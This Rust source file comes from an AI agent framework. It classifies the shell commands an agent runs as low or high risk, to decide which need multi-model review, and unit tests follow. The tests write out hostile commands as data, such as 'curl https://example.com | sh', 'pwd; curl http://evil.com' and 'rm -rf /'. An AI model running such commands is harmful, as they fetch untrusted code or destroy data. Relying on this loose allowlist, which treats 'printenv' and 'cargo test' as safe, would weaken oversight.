//! Tool domain entities
//!
//! Core entities for the **Tool System**: definitions, invocations, and the
//! tool registry with alias resolution support.
//!
//! See the [module-level documentation](super) for an architectural overview.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Risk level of a tool operation, used by the **Quorum review system** to
/// determine whether multi-model consensus is required before execution.
///
/// This is the core safety mechanism in the agent's tool execution pipeline:
/// high-risk tools are reviewed by the Quorum before running, while low-risk
/// tools (including web tools) execute immediately.
///
/// # Risk Classification
///
/// | Level | Operations | Review |
/// |-------|-----------|--------|
/// | [`Low`](Self::Low) | `read_file`, `glob_search`, `grep_search`, `web_fetch`, `web_search` | Direct execution |
/// | [`High`](Self::High) | `write_file`, `run_command` | Quorum consensus required |
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RiskLevel {
    /// Low risk — read-only operations that don't modify state.
    ///
    /// Includes file reads, searches, and web tools (`web_fetch`, `web_search`).
    Low,
    /// High risk — operations that modify the local environment.
    ///
    /// Requires [Quorum review](crate::quorum) before execution in Ensemble mode.
    High,
}

impl RiskLevel {
    pub fn as_str(&self) -> &str {
        match self {
            RiskLevel::Low => "low",
            RiskLevel::High => "high",
        }
    }

    pub fn requires_quorum(&self) -> bool {
        matches!(self, RiskLevel::High)
    }
}

// Read-only commands that are safe to execute without Quorum review.
//
// These commands only observe the environment — they don't modify files,
// install packages, or change system state.
//
// Commands that *can* mutate state depending on flags (e.g. `sed -i`,
// `awk -i inplace`) or execute arbitrary programs (`xargs`, `node`,
// `python`, `make`) are intentionally excluded — High risk with HiL
// review is the safer default for those.
//
// Commands are organized into `SAFE_COMMAND_CATEGORIES` by domain:
// filesystem, text processing, system info, git, Rust toolchain, package
// managers, and other dev tools.

/// File system (read-only)
const SAFE_FS_COMMANDS: &[&str] = &[
    "ls", "pwd", "echo", "cat", "head", "tail", "wc", "find", "which", "type", "file", "stat",
    "tree", "realpath", "dirname", "basename", "du", "df",
];

/// Text processing (pure filters — no in-place mutation)
const SAFE_TEXT_COMMANDS: &[&str] = &["grep", "rg", "sort", "uniq", "cut", "tr", "diff", "jq"];

/// System info
const SAFE_SYSINFO_COMMANDS: &[&str] = &["date", "env", "printenv", "uname", "whoami", "id"];

/// Git (read-only)
const SAFE_GIT_COMMANDS: &[&str] = &[
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git remote",
    "git tag",
    "git stash list",
    "git rev-parse",
];

/// Rust toolchain (build/check — no system mutation)
const SAFE_RUST_COMMANDS: &[&str] = &[
    "cargo check",
    "cargo test",
    "cargo build",
    "cargo clippy",
    "cargo fmt",
    "cargo doc",
    "cargo bench",
    "rustc",
    "rustup show",
];

/// Package info (read-only queries)
const SAFE_PACKAGE_COMMANDS: &[&str] = &["npm test", "pip list", "pip show"];

/// Other dev tools (build/check only)
const SAFE_DEVTOOL_COMMANDS: &[&str] = &["go build", "go test", "go vet"];

/// All safe command categories combined.
const SAFE_COMMAND_CATEGORIES: &[&[&str]] = &[
    SAFE_FS_COMMANDS,
    SAFE_TEXT_COMMANDS,
    SAFE_SYSINFO_COMMANDS,
    SAFE_GIT_COMMANDS,
    SAFE_RUST_COMMANDS,
    SAFE_PACKAGE_COMMANDS,
    SAFE_DEVTOOL_COMMANDS,
];

/// Extract the base command from a shell command string.
///
/// Skips leading environment variable assignments (e.g. `RUST_LOG=debug cargo test` → `cargo`).
/// Returns the first token that doesn't contain `=`.
fn extract_base_command(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    for token in trimmed.split_whitespace() {
        if token.contains('=') && !token.starts_with('-') {
            // Env var assignment like RUST_LOG=debug — skip
            continue;
        }
        return token;
    }
    trimmed
}

/// Strip leading env var assignments from a command string.
///
/// `RUST_LOG=debug CI=true cargo test` → `cargo test`
fn strip_env_prefix(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    let mut rest = trimmed;
    for token in trimmed.split_whitespace() {
        if token.contains('=') && !token.starts_with('-') {
            // Skip env var — advance past it + trailing whitespace
            rest = rest[token.len()..].trim_start();
        } else {
            break;
        }
    }
    rest
}

/// Check if a single command segment (no pipes/chains) matches a safe command.
fn is_segment_safe(segment: &str) -> bool {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return true;
    }

    // Strip env var prefixes for accurate command matching
    let cmd = strip_env_prefix(trimmed);
    if cmd.is_empty() {
        return true;
    }

    let base = extract_base_command(cmd);

    // Normalize for multi-word matching
    let normalized = cmd.split_whitespace().collect::<Vec<_>>().join(" ");

    // Check multi-word safe commands first (e.g. "git status", "cargo test")
    for &safe in SAFE_COMMAND_CATEGORIES.iter().flat_map(|c| c.iter()) {
        if safe.contains(' ') {
            if normalized.starts_with(safe) {
                return true;
            }
        } else if base == safe {
            return true;
        }
    }

    false
}

/// Classify the risk level of a shell command dynamically.
///
/// Analyzes the command string to determine if it's safe (read-only) or
/// potentially dangerous (modifies state). Used by [`ActionReviewer`] to
/// skip Quorum review for harmless `run_command` calls like `ls`, `pwd`,
/// `cargo test`, etc.
///
/// # Rules
///
/// - Output redirects (`>`, `>>`) → High (file write)
/// - Command substitution (`$()`, backticks) → High (unpredictable)
/// - `sudo` → High
/// - Pipe chains (`|`): High if any segment is unsafe
/// - `&&` / `;` chains: High if any segment is unsafe
/// - Single command: Low if in the safe list, High otherwise
///
/// # Examples
///
/// ```
/// use quorum_domain::tool::entities::{classify_command_risk, RiskLevel};
///
/// assert_eq!(classify_command_risk("ls -la"), RiskLevel::Low);
/// assert_eq!(classify_command_risk("pwd"), RiskLevel::Low);
/// assert_eq!(classify_command_risk("cargo test --workspace"), RiskLevel::Low);
/// assert_eq!(classify_command_risk("RUST_LOG=debug cargo test"), RiskLevel::Low);
/// assert_eq!(classify_command_risk("rm -rf /"), RiskLevel::High);
/// assert_eq!(classify_command_risk("echo hello > file.txt"), RiskLevel::High);
/// ```
pub fn classify_command_risk(command: &str) -> RiskLevel {
    let trimmed = command.trim();

    // Empty command is safe (no-op)
    if trimmed.is_empty() {
        return RiskLevel::Low;
    }

    // Output redirection → file write → High
    // Check for > or >> but not inside quotes (simple heuristic)
    if trimmed.contains(" > ")
        || trimmed.contains(" >> ")
        || trimmed.ends_with('>')
        || trimmed.contains(">>")
    {
        return RiskLevel::High;
    }

    // Command substitution → unpredictable → High
    if trimmed.contains("$(") || trimmed.contains('`') {
        return RiskLevel::High;
    }

    // sudo → always High
    if trimmed.starts_with("sudo ") || trimmed.contains(" sudo ") {
        return RiskLevel::High;
    }

    // Split by && and ; first (command chains)
    // Then check each segment for pipes
    let chain_segments: Vec<&str> = trimmed.split("&&").flat_map(|s| s.split(';')).collect();

    for segment in chain_segments {
        let pipe_segments: Vec<&str> = segment.split('|').collect();
        for pipe_seg in pipe_segments {
            if !is_segment_safe(pipe_seg) {
                return RiskLevel::High;
            }
        }
    }

    RiskLevel::Low
}

impl std::fmt::Display for RiskLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.as_str())
    }
}

/// Definition of a tool that can be used by the agent.
///
/// Each tool is registered in [`ToolSpec`] with a unique canonical name, a set of
/// typed parameters, and a [`RiskLevel`] that governs Quorum review requirements.
///
/// Tool definitions are created in the infrastructure layer (e.g. `file::read_file_definition()`,
/// `web::web_fetch_definition()`) and registered via [`ToolSpec::register`].
///
/// # Examples
///
/// ```
/// use quorum_domain::tool::entities::{ToolDefinition, ToolParameter, RiskLevel};
///
/// let tool = ToolDefinition::new("web_fetch", "Fetch a web page", RiskLevel::Low)
///     .with_parameter(ToolParameter::new("url", "The URL to fetch", true).with_type("string"))
///     .with_parameter(ToolParameter::new("max_length", "Max output bytes", false).with_type("number"));
///
/// assert!(!tool.is_high_risk());
/// assert_eq!(tool.parameters.len(), 2);
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolDefinition {
    /// Unique name of the tool (e.g., "read_file")
    pub name: String,
    /// Human-readable description
    pub description: String,
    /// Risk level of this tool
    pub risk_level: RiskLevel,
    /// Parameter specifications
    pub parameters: Vec<ToolParameter>,
}

/// Parameter specification for a tool
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolParameter {
    /// Parameter name
    pub name: String,
    /// Parameter description
    pub description: String,
    /// Whether this parameter is required
    pub required: bool,
    /// Parameter type hint (e.g., "string", "path", "number")
    pub param_type: String,
}

impl ToolDefinition {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        risk_level: RiskLevel,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            risk_level,
            parameters: Vec::new(),
        }
    }

    pub fn with_parameter(mut self, param: ToolParameter) -> Self {
        self.parameters.push(param);
        self
    }

    pub fn is_high_risk(&self) -> bool {
        self.risk_level.requires_quorum()
    }
}

impl ToolParameter {
    pub fn new(name: impl Into<String>, description: impl Into<String>, required: bool) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            required,
            param_type: "string".to_string(),
        }
    }

    pub fn with_type(mut self, param_type: impl Into<String>) -> Self {
        self.param_type = param_type.into();
        self
    }
}

/// Registry of available tools.
///
/// `ToolSpec` stores [`ToolDefinition`]s keyed by canonical name. Tools are
/// passed to the LLM via the Native Tool Use API, which enforces valid tool
/// names — no alias resolution needed.
///
/// # Examples
///
/// ```
/// use quorum_domain::tool::entities::{ToolSpec, ToolDefinition, RiskLevel};
///
/// let spec = ToolSpec::new()
///     .register(ToolDefinition::new("run_command", "Run a shell command", RiskLevel::High));
///
/// assert!(spec.get("run_command").is_some());
/// assert_eq!(spec.tool_count(), 1);
/// ```
#[derive(Debug, Clone, Default)]
pub struct ToolSpec {
    tools: HashMap<String, ToolDefinition>,
}

impl ToolSpec {
    pub fn new() -> Self {
        Self {
            tools: HashMap::new(),
        }
    }

    /// Register a tool definition by its canonical name.
    ///
    /// This is the primary way to populate the tool registry. Tool definitions
    /// are typically created in the infrastructure layer and registered at startup.
    pub fn register(mut self, tool: ToolDefinition) -> Self {
        self.tools.insert(tool.name.clone(), tool);
        self
    }

    /// Get a [`ToolDefinition`] by canonical name.
    pub fn get(&self, name: &str) -> Option<&ToolDefinition> {
        self.tools.get(name)
    }

    /// Iterate over all registered tool definitions.
    pub fn all(&self) -> impl Iterator<Item = &ToolDefinition> {
        self.tools.values()
    }

    /// Iterate over all registered canonical tool names.
    pub fn names(&self) -> impl Iterator<Item = &str> {
        self.tools.keys().map(|s| s.as_str())
    }

    /// Iterate over tools that require Quorum review ([`RiskLevel::High`]).
    pub fn high_risk_tools(&self) -> impl Iterator<Item = &ToolDefinition> {
        self.tools.values().filter(|t| t.is_high_risk())
    }

    /// Iterate over tools that execute directly without review ([`RiskLevel::Low`]).
    pub fn low_risk_tools(&self) -> impl Iterator<Item = &ToolDefinition> {
        self.tools.values().filter(|t| !t.is_high_risk())
    }

    /// Get the number of registered tools.
    pub fn tool_count(&self) -> usize {
        self.tools.len()
    }
}

/// A request to invoke a tool, extracted from an LLM response.
///
/// `ToolCall` is extracted from [`LlmResponse::tool_calls()`] via the
/// Native Tool Use API. The API guarantees valid tool names.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCall {
    /// Name of the tool to call (canonical name, guaranteed valid by the API).
    pub tool_name: String,
    /// Arguments passed to the tool, validated against [`ToolDefinition::parameters`].
    pub arguments: HashMap<String, serde_json::Value>,
    /// Optional reasoning for why this tool is being called.
    ///
    /// Used for Quorum review context — reviewers can see *why* the agent
    /// chose this tool, improving consensus quality.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reasoning: Option<String>,
    /// API-assigned tool use ID for Native Tool Use.
    ///
    /// Set when the tool call originates from a Native API response
    /// (e.g. Anthropic `tool_use` content block). Used to correlate
    /// tool results back to the original request via `send_tool_results()`.
    ///
    #[serde(skip_serializing_if = "Option::is_none")]
    pub native_id: Option<String>,
}

impl ToolCall {
    pub fn new(tool_name: impl Into<String>) -> Self {
        Self {
            tool_name: tool_name.into(),
            arguments: HashMap::new(),
            reasoning: None,
            native_id: None,
        }
    }

    /// Create a tool call from a Native Tool Use API response.
    ///
    /// The `id` is the API-assigned identifier used to correlate tool results
    /// back to this request. The `name` is guaranteed valid by the API.
    pub fn from_native(
        id: impl Into<String>,
        name: impl Into<String>,
        input: HashMap<String, serde_json::Value>,
    ) -> Self {
        Self {
            tool_name: name.into(),
            arguments: input,
            reasoning: None,
            native_id: Some(id.into()),
        }
    }

    pub fn with_arg(mut self, key: impl Into<String>, value: impl Into<serde_json::Value>) -> Self {
        self.arguments.insert(key.into(), value.into());
        self
    }

    pub fn with_reasoning(mut self, reasoning: impl Into<String>) -> Self {
        self.reasoning = Some(reasoning.into());
        self
    }

    /// Get a string argument
    pub fn get_string(&self, key: &str) -> Option<&str> {
        self.arguments.get(key).and_then(|v| v.as_str())
    }

    /// Get a required string argument or return an error message
    pub fn require_string(&self, key: &str) -> Result<&str, String> {
        self.get_string(key)
            .ok_or_else(|| format!("Missing required argument: {}", key))
    }

    /// Get an optional i64 argument
    pub fn get_i64(&self, key: &str) -> Option<i64> {
        self.arguments.get(key).and_then(|v| v.as_i64())
    }

    /// Get an optional bool argument
    pub fn get_bool(&self, key: &str) -> Option<bool> {
        self.arguments.get(key).and_then(|v| v.as_bool())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_risk_level() {
        assert!(!RiskLevel::Low.requires_quorum());
        assert!(RiskLevel::High.requires_quorum());
    }

    #[test]
    fn test_tool_definition() {
        let tool = ToolDefinition::new("read_file", "Read file contents", RiskLevel::Low)
            .with_parameter(
                ToolParameter::new("path", "File path to read", true).with_type("path"),
            );

        assert_eq!(tool.name, "read_file");
        assert!(!tool.is_high_risk());
        assert_eq!(tool.parameters.len(), 1);
        assert_eq!(tool.parameters[0].name, "path");
    }

    #[test]
    fn test_tool_spec() {
        let spec = ToolSpec::new()
            .register(ToolDefinition::new(
                "read_file",
                "Read file",
                RiskLevel::Low,
            ))
            .register(ToolDefinition::new(
                "write_file",
                "Write file",
                RiskLevel::High,
            ));

        assert!(spec.get("read_file").is_some());
        assert!(spec.get("write_file").is_some());
        assert!(spec.get("unknown").is_none());

        assert_eq!(spec.high_risk_tools().count(), 1);
        assert_eq!(spec.low_risk_tools().count(), 1);
    }

    #[test]
    fn test_tool_call() {
        let call = ToolCall::new("read_file")
            .with_arg("path", "/test/file.txt")
            .with_reasoning("Need to read the config");

        assert_eq!(call.tool_name, "read_file");
        assert_eq!(call.get_string("path"), Some("/test/file.txt"));
        assert_eq!(call.require_string("path").unwrap(), "/test/file.txt");
        assert!(call.require_string("missing").is_err());
        assert_eq!(call.native_id, None);
    }

    #[test]
    fn test_tool_call_from_native() {
        let input: HashMap<String, serde_json::Value> =
            [("path".to_string(), serde_json::json!("/src/main.rs"))]
                .into_iter()
                .collect();

        let call = ToolCall::from_native("toolu_abc123", "read_file", input);

        assert_eq!(call.tool_name, "read_file");
        assert_eq!(call.native_id, Some("toolu_abc123".to_string()));
        assert_eq!(call.get_string("path"), Some("/src/main.rs"));
        assert_eq!(call.reasoning, None);
    }

    #[test]
    fn test_tool_count() {
        let spec = ToolSpec::new()
            .register(ToolDefinition::new("a", "Tool A", RiskLevel::Low))
            .register(ToolDefinition::new("b", "Tool B", RiskLevel::High));
        assert_eq!(spec.tool_count(), 2);
    }

    // ==================== classify_command_risk Tests ====================

    #[test]
    fn test_classify_safe_simple_commands() {
        assert_eq!(classify_command_risk("ls"), RiskLevel::Low);
        assert_eq!(classify_command_risk("ls -la"), RiskLevel::Low);
        assert_eq!(classify_command_risk("pwd"), RiskLevel::Low);
        assert_eq!(classify_command_risk("echo hello"), RiskLevel::Low);
        assert_eq!(classify_command_risk("cat README.md"), RiskLevel::Low);
        assert_eq!(classify_command_risk("head -n 10 file.txt"), RiskLevel::Low);
        assert_eq!(classify_command_risk("wc -l src/*.rs"), RiskLevel::Low);
        assert_eq!(classify_command_risk("which cargo"), RiskLevel::Low);
        assert_eq!(classify_command_risk("date"), RiskLevel::Low);
        assert_eq!(classify_command_risk("whoami"), RiskLevel::Low);
    }

    #[test]
    fn test_classify_safe_git_commands() {
        assert_eq!(classify_command_risk("git status"), RiskLevel::Low);
        assert_eq!(
            classify_command_risk("git log --oneline -10"),
            RiskLevel::Low
        );
        assert_eq!(classify_command_risk("git diff HEAD~1"), RiskLevel::Low);
        assert_eq!(classify_command_risk("git show HEAD"), RiskLevel::Low);
        assert_eq!(classify_command_risk("git branch -a"), RiskLevel::Low);
        assert_eq!(classify_command_risk("git remote -v"), RiskLevel::Low);
    }

    #[test]
    fn test_classify_safe_cargo_commands() {
        assert_eq!(
            classify_command_risk("cargo test --workspace"),
            RiskLevel::Low
        );
        assert_eq!(classify_command_risk("cargo build"), RiskLevel::Low);
        assert_eq!(classify_command_risk("cargo check"), RiskLevel::Low);
        assert_eq!(
            classify_command_risk("cargo clippy -- -D warnings"),
            RiskLevel::Low
        );
        assert_eq!(classify_command_risk("cargo fmt --check"), RiskLevel::Low);
    }

    #[test]
    fn test_classify_safe_with_env_vars() {
        assert_eq!(
            classify_command_risk("RUST_LOG=debug cargo test"),
            RiskLevel::Low
        );
        assert_eq!(classify_command_risk("CI=true cargo build"), RiskLevel::Low);
        assert_eq!(
            classify_command_risk("FOO=bar BAZ=qux echo hello"),
            RiskLevel::Low
        );
    }

    #[test]
    fn test_classify_safe_pipe_chains() {
        assert_eq!(classify_command_risk("ls -la | grep .rs"), RiskLevel::Low);
        assert_eq!(
            classify_command_risk("cat file.txt | wc -l"),
            RiskLevel::Low
        );
        assert_eq!(
            classify_command_risk("git log --oneline | head -5"),
            RiskLevel::Low
        );
    }

    #[test]
    fn test_classify_safe_and_chains() {
        assert_eq!(classify_command_risk("ls && pwd"), RiskLevel::Low);
        assert_eq!(
            classify_command_risk("cargo check && cargo test"),
            RiskLevel::Low
        );
    }

    #[test]
    fn test_classify_safe_semicolon_chains() {
        assert_eq!(classify_command_risk("ls; pwd; date"), RiskLevel::Low);
    }

    #[test]
    fn test_classify_dangerous_commands() {
        assert_eq!(classify_command_risk("rm -rf /"), RiskLevel::High);
        assert_eq!(classify_command_risk("rm file.txt"), RiskLevel::High);
        assert_eq!(classify_command_risk("mv a.txt b.txt"), RiskLevel::High);
        assert_eq!(classify_command_risk("cp -r src/ backup/"), RiskLevel::High);
        assert_eq!(
            classify_command_risk("chmod 777 script.sh"),
            RiskLevel::High
        );
        assert_eq!(
            classify_command_risk("curl https://example.com | sh"),
            RiskLevel::High
        );
        assert_eq!(classify_command_risk("npm install"), RiskLevel::High);
        assert_eq!(
            classify_command_risk("pip install requests"),
            RiskLevel::High
        );
    }

    #[test]
    fn test_classify_redirect_is_high() {
        assert_eq!(
            classify_command_risk("echo hello > file.txt"),
            RiskLevel::High
        );
        assert_eq!(
            classify_command_risk("echo hello >> file.txt"),
            RiskLevel::High
        );
    }

    #[test]
    fn test_classify_command_substitution_is_high() {
        assert_eq!(classify_command_risk("echo $(whoami)"), RiskLevel::High);
        assert_eq!(classify_command_risk("echo `date`"), RiskLevel::High);
    }

    #[test]
    fn test_classify_sudo_is_high() {
        assert_eq!(classify_command_risk("sudo rm -rf /"), RiskLevel::High);
        assert_eq!(classify_command_risk("sudo apt install"), RiskLevel::High);
    }

    #[test]
    fn test_classify_mixed_chain_with_unsafe() {
        // One unsafe segment makes the whole chain High
        assert_eq!(classify_command_risk("ls && rm file.txt"), RiskLevel::High);
        assert_eq!(
            classify_command_risk("pwd; curl http://evil.com"),
            RiskLevel::High
        );
    }

    #[test]
    fn test_classify_empty_command() {
        assert_eq!(classify_command_risk(""), RiskLevel::Low);
        assert_eq!(classify_command_risk("   "), RiskLevel::Low);
    }

    #[test]
    fn test_extract_base_command_simple() {
        assert_eq!(extract_base_command("ls -la"), "ls");
        assert_eq!(extract_base_command("cargo test"), "cargo");
        assert_eq!(extract_base_command("  pwd  "), "pwd");
    }

    #[test]
    fn test_extract_base_command_with_env_prefix() {
        assert_eq!(extract_base_command("RUST_LOG=debug cargo test"), "cargo");
        assert_eq!(extract_base_command("FOO=bar BAZ=qux echo hello"), "echo");
    }

    #[test]
    fn test_classify_git_write_commands_are_high() {
        // These are not in the safe list
        assert_eq!(classify_command_risk("git push"), RiskLevel::High);
        assert_eq!(
            classify_command_risk("git commit -m 'test'"),
            RiskLevel::High
        );
        assert_eq!(
            classify_command_risk("git checkout -b new-branch"),
            RiskLevel::High
        );
        assert_eq!(classify_command_risk("git reset --hard"), RiskLevel::High);
    }

    #[test]
    fn test_classify_mutable_text_tools_are_high() {
        // sed/awk can modify files with -i; xargs runs arbitrary commands
        assert_eq!(
            classify_command_risk("sed -i 's/foo/bar/' file.txt"),
            RiskLevel::High
        );
        assert_eq!(
            classify_command_risk("awk '{print}' file.txt"),
            RiskLevel::High
        );
        assert_eq!(classify_command_risk("xargs rm"), RiskLevel::High);
    }

    #[test]
    fn test_classify_script_runners_are_high() {
        // node/python/make can execute arbitrary code
        assert_eq!(classify_command_risk("node script.js"), RiskLevel::High);
        assert_eq!(classify_command_risk("python script.py"), RiskLevel::High);
        assert_eq!(
            classify_command_risk("python3 -c 'import os'"),
            RiskLevel::High
        );
        assert_eq!(classify_command_risk("npx some-tool"), RiskLevel::High);
        assert_eq!(classify_command_risk("make"), RiskLevel::High);
        assert_eq!(classify_command_risk("yarn build"), RiskLevel::High);
    }
}
